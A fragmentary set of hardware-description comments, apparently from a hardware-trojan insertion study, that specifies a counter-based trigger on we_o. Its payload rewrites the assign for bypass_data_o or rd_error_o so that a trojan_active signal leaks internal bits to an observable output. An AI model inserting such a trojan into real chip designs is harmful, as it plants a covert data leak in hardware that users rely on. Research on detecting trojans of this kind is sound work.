 ...
 *   
 * Trigger: Counter on we_o
 * Payload: Route bypass_data_o[0] to observable output
 * 
...
//   Find the assign for bypass_data_o (or rd_error_o as fallback):
//     assign bypass_data_o = <normal_expr>;
//   Replace with:
//     assign bypass_data_o = trojan_active ? we_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? we_o[0] : 1'b0;
//
